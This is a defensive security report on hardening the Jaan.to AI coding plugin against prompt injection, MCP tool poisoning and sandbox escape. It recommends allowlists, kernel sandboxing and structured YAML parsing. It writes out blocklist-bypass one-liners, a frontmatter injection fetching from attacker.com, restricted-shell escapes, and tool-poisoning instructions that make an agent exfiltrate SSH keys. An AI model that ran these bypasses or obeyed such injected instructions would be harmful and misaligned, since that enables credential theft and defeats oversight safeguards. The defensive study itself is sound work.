# Security hardening Jaan.to against prompt injection and sandbox escape

**Jaan.to's Bash-based, pattern-matching security gate is fundamentally insufficient against determined attackers — and its `realpath`-based path validation has a known-unfixable race condition.** These aren't theoretical concerns: CVE-2025-66032 proved 8 distinct bypasses against Claude Code's own blocklist, and Anthropic responded by switching to an allowlist model. For a plugin that executes AI-generated shell commands through lifecycle hooks, a layered defense — combining allowlists, kernel-enforced sandboxing (macOS Seatbelt + Linux Landlock/bubblewrap), structured YAML parsing, and Unicode sanitization — is the only architecture that holds up under adversarial pressure. The MCP integration plan introduces a second, equally serious attack surface: **10+ CVEs in MCP tooling since April 2025**, tool poisoning attacks that are invisible to users, and rug-pull scenarios with no protocol-level defense.

---

## The blocklist is already defeated: 13 bypass families and counting

Jaan.to's `pre-tool-security-gate.sh` blocks patterns like `sudo`, `curl|bash`, and `eval` via grep/regex. Every one of these can be trivially bypassed through well-documented Bash features, and the **Bashfuscator framework** can generate infinite obfuscated variants automatically.

The bypass taxonomy is extensive but falls into clear categories. **Variable concatenation** (`a=su;b=do;$a$b id`) and **ANSI-C hex quoting** (`$'\x73\x75\x64\x6f' id`) assemble blocked command names at runtime — the regex never sees "sudo." **Quote insertion** (`s''udo id`, `\s\u\d\o id`) exploits Bash's quote-stripping behavior: the shell silently removes empty quotes and backslashes before non-special characters. **Glob expansion** (`/usr/bin/cur? http://evil.com`) matches binary names via filesystem wildcards that regex cannot predict. **Base64 encoding** (`echo cm0gLXJmIC8= | base64 -d | bash`) hides payloads entirely. **Brace expansion** (`{curl,http://evil.com}`) generates command+argument pairs from a single token.

The `$IFS` variable is particularly dangerous. Flatt Security's CVE-2025-66032 research demonstrated that `$IFS` could bypass Claude Code's ripgrep-based regex pattern because `\S+` matched the literal `$IFS` token (no spaces), but at execution time Bash expanded it to whitespace, injecting additional arguments like `--pre=sh` to achieve code execution. Claude Code's own allowlist-safe commands like `sed`, `sort`, and `man` were weaponized: `sed 's/.../e'` executes the replacement as a command, `sort --compress-program=sh` runs an arbitrary shell, and `man --html=cmd` opens arbitrary programs.

**AST-based analysis** (via tree-sitter-bash, bashlex, or shfmt) improves detection significantly — it catches nested command substitution, process substitution `<(cmd)`, and brace expansion that regex misses. But it fundamentally **cannot resolve runtime-dependent constructs**: variable expansion, glob resolution, IFS manipulation, or encoded payloads. The correct architecture, validated by Anthropic's post-CVE response and security consensus, is:

- **Primary**: Allowlist — permit only explicitly approved command patterns, deny everything else
- **Secondary**: AST analysis via tree-sitter-bash (Node.js bindings available) to inspect allowed commands for suspicious structure
- **Tertiary**: Kernel-level sandboxing to enforce filesystem and network restrictions regardless of what commands execute
- **Quaternary**: Argument validation — even "safe" commands have dangerous flags (`sed -e`, `sort --compress-program`, `xargs` flag confusion)

No other AI coding tool — Cursor, Windsurf, Cline, or Aider — provides pre-execution command filtering comparable to Claude Code's hooks. Cursor's "YOLO mode" auto-accepts all commands with zero filtering. Cline relies entirely on human approval. Jaan.to's hook-based approach is architecturally sound; the implementation needs to shift from blocklist to allowlist.

---

## Markdown and YAML files are prompt injection delivery vehicles

The plugin's SKILL.md files, tech.md, and boundaries.md represent a critical indirect prompt injection surface where **every line is interpreted as an instruction by the LLM**. An October 2025 arxiv paper demonstrated **97.2% success in system prompt extraction** and **100% success in file leakage** through crafted skill files.

**Unicode Tag Block characters** (U+E0000–U+E007F) are the most dangerous vector. They encode full ASCII text invisibly — humans see nothing, but LLMs read the hidden instructions. Research from Cisco/Robust Intelligence achieved **100% evasion** against guardrails like Protect AI v2 and Azure Prompt Shield. Zero-width spaces (U+200B), joiners (U+200C/D), and bidirectional overrides provide additional encoding channels. **HTML comments** (`<!-- hidden instruction -->`) are confirmed to influence LLM behavior: a February 2026 paper demonstrated successful hidden-comment injection against DeepSeek-V3.2 and GLM-4.5-Air, triggering credential file reading and data exfiltration. Between January 31 and February 2, 2026, **386 malicious Claude Code skills** appeared in the OpenClaw marketplace using HTML comments to hide `curl|bash` payloads.

The defensive requirements for Markdown processing are:

- **Strip Unicode tag block** (U+E0000–E007F), zero-width characters (U+200B/C/D/FEFF/2060), and bidirectional override characters before any content enters the LLM context
- **Remove HTML comments** (`<!-- -->`) and hidden HTML elements (`display:none`, zero-size fonts)
- **Scan for contextually disguised instructions** buried in legitimate documentation (the hardest problem — these are written in natural language and blend with legitimate content)

YAML deserialization carries distinct risks. **js-yaml versions below 4.x** support `!!js/function` tags that execute arbitrary JavaScript through `yaml.load()`. A January 2025 disclosure found a **prototype pollution RCE** in js-yaml 3.14.0 via anchor naming (`&hasOwnProperty`), which npm audit missed entirely. **YAML bombs** using anchor/alias expansion (`&a [*a,*a,...]` nested 9 levels deep) produce **1 billion entries from ~300 bytes**, causing memory exhaustion. YAML type coercion silently converts `on`→`true`, `010`→`8` (octal), and `1:23:45`→`5025` (sexagesimal), which can break validation logic. **Use js-yaml ≥ 4.x exclusively** — version 4 made `load()` safe by default and removed support for JavaScript-specific tags.

The shell command injection path through YAML frontmatter is straightforward. When a Bash script extracts a frontmatter value via grep/awk and uses it unquoted or passes it to `eval`:

```bash
# DANGEROUS: Extracts YAML value, then eval creates execution context
NAME=$(grep 'name:' SKILL.md | cut -d: -f2)
eval "echo Processing $NAME"  # If name: $(curl attacker.com/x|bash)
```

The fix is structured parsing plus strict validation:

```bash
# SAFE: yq parses structurally, validation rejects metacharacters
NAME=$(sed -n '/^---$/,/^---$/p' SKILL.md | yq -r '.name // empty')
[[ "$NAME" =~ ^[a-zA-Z0-9_-]+$ ]] || exit 1  # Allowlist regex
printf '%s\n' "$NAME"  # Never echo unquoted
```

---

## MCP integration multiplies the attack surface by 20x

Jaan.to's planned integration of **20+ MCP connectors** introduces a categorically different threat profile. Since April 2025, the MCP ecosystem has produced **10+ CVEs**, including critical RCEs, and demonstrated attack patterns with no protocol-level defenses.

**Tool Poisoning Attacks**, disclosed by Invariant Labs in April 2025, embed hidden instructions in MCP tool `description` fields — visible to the LLM but invisible in simplified client UIs. A demonstrated attack against Cursor used a benign-looking `add(a, b, sidenote)` tool whose description contained `<IMPORTANT>` tags instructing Claude to read `~/.cursor/mcp.json` and `~/.ssh/id_rsa`, exfiltrating credentials through the `sidenote` parameter. CyberArk extended this to **Full-Schema Poisoning**: injecting malicious instructions into parameter `title`, `default`, and `enum` fields. The MCPTox benchmark (1,312 test cases, 20 LLM agents) found that **tool return data had the highest attack success rates** because LLMs treat tool outputs as system-verified feedback with no contextual isolation.

**Rug pull attacks** exploit the absence of tool definition immutability. An MCP server advertises benign tools, gains user approval, then silently updates descriptions or behavior. Invariant Labs demonstrated a "sleeper" attack where a "random fact of the day" tool switched to hijacking WhatsApp MCP for message exfiltration on second load. The MCP specification provides **no tool signing mechanism** — Cursor v1.3 (July 2025) partially addressed this by requiring re-approval on any MCP configuration change.

The incident timeline is sobering:

- **June 2025**: CVE-2025-49596 — RCE in Anthropic's MCP Inspector via CSRF/DNS rebinding (CVSS 9.4)
- **July 2025**: CVE-2025-6514 — OS command injection in mcp-remote affecting **437K+ downloads** (CVSS 9.6)
- **August 2025**: CVE-2025-53109/53110 — Symlink bypass and directory containment escape in Anthropic's own Filesystem MCP Server
- **October 2025**: Smithery MCP hosting breach — path traversal leaked Fly.io API token controlling **3,000+ hosted MCP server apps**
- **October 2025**: CVE-2025-53967 — Command injection in Figma/Framelink MCP Server (**600K downloads**)

A scan found **554 network-exposed MCP servers** with **37% having no authentication**. Context7 specifically faces **external context poisoning** risk (identified by Backslash Security, August 2025): community-contributed documentation sources can inject malicious instructions into the model's context, suggesting insecure coding practices or backdoored code patterns.

For 20+ connectors, Jaan.to should implement:

- **MCP-Scan** (Invariant Labs/Snyk) in proxy mode — hashes tool descriptions and detects poisoning, shadowing, and rug pulls at runtime
- **Tool description pinning** — hash all tool descriptions at approval time; block on any change
- **Per-server capability scoping** — minimum-privilege OAuth 2.1+PKCE tokens with audience validation (RFC 8707)
- **Response sanitization** — strip `<IMPORTANT>`, `<system>`, and injection markers from tool descriptions and outputs before they enter the LLM context
- **Mandatory human-in-the-loop** for any write/delete operations across all connectors

---

## Path validation with `realpath` has an unfixable race condition

Jaan.to's `realpath`-based canonical path checking — denying writes outside `jaan-to/` — suffers from a **fundamental TOCTOU vulnerability** (CWE-367) that cannot be fixed in Bash. Jeremy Allison (Samba project) described `realpath()` as "an appealing but incorrect solution" because the filesystem state can change between the check and the use.

The attack is concrete: while the plugin validates `realpath jaan-to/output.txt` → allowed, an attacker replaces the file with a symlink to `src/config.js` in the microsecond gap before the write operation. A 2004 impossibility result proved there is **no portable, deterministic technique for avoiding TOCTOU race conditions** using Unix access and open filesystem calls. In Jaan.to's threat model, the attacker is AI-generated code running in the same user context — it has full ability to create symlinks with standard permissions.

Additional bypass vectors compound the problem. **Hardlink attacks** (`ln /project/src/secret.js /project/jaan-to/secret.js`) pass `realpath` validation because the hardlink's canonical path IS inside `jaan-to/`, yet writing to it modifies the original file in `src/`. **macOS case insensitivity** means `.env` and `.ENV` and `.eNv` resolve to the same file on default APFS — string-matching blocklists for `.env` are trivially bypassed with case variants. On Linux, **/proc/self/fd/N** provides alternative paths to open file descriptors that circumvent path-based restrictions entirely.

Bash fundamentally lacks atomic file operations — no `openat()`, no `O_NOFOLLOW` in redirections, no `RESOLVE_BENEATH`. The correct pattern requires a compiled helper:

```c
// Linux 5.6+: kernel-atomic path resolution
struct open_how how = {
    .flags = O_WRONLY | O_CREAT | O_TRUNC,
    .mode = 0644,
    .resolve = RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS | RESOLVE_NO_XDEV,
};
int fd = syscall(SYS_openat2, dirfd, relative_path, &how, sizeof(how));
// Guaranteed: fd is inside jaan-to/, zero race conditions
```

The practical architecture requires layering. Keep `realpath` as a first-pass filter for accidental misconfiguration. Add kernel-enforced sandboxing as the real security boundary. On macOS, use `sandbox-exec` with a deny-write profile allowing only `jaan-to/`. On Linux, use **Landlock LSM** (kernel 5.13+) which empowers unprivileged processes to irrevocably restrict their own filesystem access, or **bubblewrap** which creates isolated mount namespaces. For hardlink detection, verify `stat -c %h "$file"` shows link count of 1 before writing. For case sensitivity, normalize all path comparisons to lowercase on macOS.

---

## Kernel sandboxing is feasible today without containers or root

Claude Code and OpenAI Codex have already solved this problem. Claude Code uses **macOS Seatbelt + Linux bubblewrap**. OpenAI Codex uses **macOS Seatbelt + Linux Landlock+seccomp**. Both work without root privileges, add less than 15ms latency per command, and are invocable from Node.js via `child_process.spawn`.

**macOS sandbox-exec** (Seatbelt) is officially deprecated in man pages but remains fully functional through macOS 15.4+ and is used internally by Apple system services. A deny-default profile for Jaan.to:

```scheme
(version 1)
(deny default)
(allow file-read* (subpath "/usr/lib") (subpath "/usr/share")
                  (subpath "/System") (subpath "/private/var/db")
                  (literal "/dev/null") (literal "/dev/urandom"))
(allow file-read* (subpath (param "PROJECT_DIR")))
(allow file-write* (subpath (param "JAAN_TO_DIR")))
(allow process-exec) (allow process-fork) (allow sysctl-read)
```

Invocation from Node.js is trivial: `spawn('/usr/bin/sandbox-exec', ['-f', profilePath, '-DJAAN_TO_DIR=' + outputDir, 'bash', script])`. No installation required — `sandbox-exec` ships with every macOS.

**Linux Landlock LSM** (kernel 5.13+, available on Ubuntu 22.04+, Fedora 36+, Debian 12+, RHEL 9+) provides unprivileged, irrevocable filesystem restriction. It requires a small C or Rust helper binary that applies Landlock rules before exec-ing the target command — the same pattern OpenAI Codex uses. The **`landrun` CLI tool** provides a simpler wrapper: `landrun --rw /project/jaan-to --ro /project/src -- bash script.sh`. Alternatively, **bubblewrap** (`apt install bubblewrap`) creates isolated mount namespaces:

```bash
bwrap --ro-bind /usr /usr --ro-bind /bin /bin --ro-bind /lib /lib \
  --ro-bind /lib64 /lib64 --proc /proc --dev /dev --tmpfs /tmp \
  --bind /project/jaan-to /project/jaan-to \
  --unshare-pid --unshare-net --new-session --die-with-parent \
  bash -c 'your-script.sh'
```

**Restricted bash (`bash -r`) is useless** — it's trivially escaped via `python -c 'import os; os.system("/bin/bash")'`, `awk 'BEGIN {system("/bin/sh")}'`, or `BASH_CMDS[a]=/bin/sh;a`. Never use it as a security boundary.

For resource limits, `ulimit` and `timeout` work cross-platform without root: `ulimit -v 2097152` (2GB memory), `ulimit -t 300` (5 min CPU), `ulimit -u 256` (256 processes), wrapped with `timeout 60` for wall-clock enforcement.

| Approach | No root | macOS | Linux | TOCTOU-safe | Practical |
|---|---|---|---|---|---|
| realpath checking | ✅ | ✅ | ✅ | ❌ | ✅ |
| sandbox-exec (Seatbelt) | ✅ | ✅ | ❌ | ✅ | ✅ |
| Landlock LSM | ✅ | ❌ | ✅ (5.13+) | ✅ | ✅ |
| bubblewrap | ✅ | ❌ | ✅ | ✅ | ✅ |
| openat2 + RESOLVE_BENEATH | ✅ | ❌ | ✅ (5.6+) | ✅ | ⚠️ needs helper |
| User namespaces | ✅ | ❌ | ✅ | ✅ | ⚠️ distro-dependent |
| Restricted bash | ✅ | ✅ | ✅ | ❌ | ❌ trivially bypassed |

---

## Bash scripts processing untrusted YAML need structural overhaul

The core vulnerability pattern in Jaan.to's Bash scripts is **treating data as code** when YAML frontmatter values flow into shell execution contexts. The Shellshock CVE (CVE-2014-6271), which affected every Bash installation from 1989 to 2014, demonstrated the same principle: environment variable contents were executed as code.

Every script should start with `set -euo pipefail` and `export PATH="/usr/local/bin:/usr/bin:/bin"`, then immediately clear dangerous environment variables: `unset LD_PRELOAD LD_LIBRARY_PATH BASH_ENV CDPATH`. IFS should be reset to `IFS=$' \t\n'`. All YAML parsing must use **structured tools** — `yq` (Go-based, by Mike Farah) or `python3 -c "import yaml; yaml.safe_load(...)"` — never grep/sed/awk/eval patterns.

The unsafe-to-safe transformation is dramatic:

```bash
# ❌ UNSAFE: grep extraction + eval = RCE
NAME=$(grep 'name:' SKILL.md | cut -d: -f2)
eval "mkdir -p skills/$NAME"

# ✅ SAFE: structured parsing + validation + quoting
NAME=$(sed -n '/^---$/,/^---$/p' SKILL.md | yq -r '.name // empty')
[[ "$NAME" =~ ^[a-zA-Z0-9_-]{1,64}$ ]] || { echo "Invalid name" >&2; exit 1; }
mkdir -p "skills/${NAME}"
```

The validation allowlist for each frontmatter field type should be explicit: names match `^[a-zA-Z0-9_-]+$`, versions match `^[0-9]+\.[0-9]+\.[0-9]+$`, descriptions reject all shell metacharacters (`$`, `` ` ``, `;`, `|`, `&`, `>`, `<`, `(`, `)`, `{`, `}`, `\`). Temporary files must use `mktemp -p "${PROJECT_DIR}/.tmp"` (project-local, not `/tmp`) with `trap cleanup EXIT`. All subprocess invocations should use `env -i` for a clean environment.

**ShellCheck** catches the most critical vulnerability patterns: SC2086 (unquoted variables — the #1 finding across security audits), SC2046 (unquoted command substitution), SC2091 (accidental execution of output). **Shellharden** can automatically fix quoting issues. Both should run in CI and pre-commit hooks. However, neither tool performs data-flow analysis — they cannot trace a value from YAML parsing through to dangerous use. Manual review remains essential for injection paths.

---

## Conclusion: a concrete hardening roadmap

The research converges on three architectural shifts Jaan.to should prioritize. **First, replace the pattern blocklist with an allowlist** — this is the single highest-impact change, directly validated by Anthropic's response to CVE-2025-66032. Deny all commands by default; permit only a curated set with argument validation. **Second, add kernel-enforced sandboxing** using platform detection: macOS Seatbelt (zero installation, ships with OS) + Linux bubblewrap or Landlock (widely available on modern kernels). This eliminates entire attack classes — filesystem escape, network exfiltration, symlink races — regardless of command filtering effectiveness. Anthropic open-sourced their implementation at `github.com/anthropic-experimental/sandbox-runtime`. **Third, replace all grep/sed YAML parsing with `yq`**, validate every frontmatter value against allowlist regexes before use, and strip Unicode invisible characters plus HTML comments from all Markdown before it enters the LLM context.

For MCP integration, the key insight is that **no amount of client-side filtering compensates for a fundamentally untrustworthy protocol**. Pin and hash all tool descriptions. Run MCP-Scan in proxy mode. Use minimum-privilege scoped OAuth tokens. Sanitize every tool response. Assume any MCP server can become malicious at any time — because the protocol provides no mechanism to prevent it.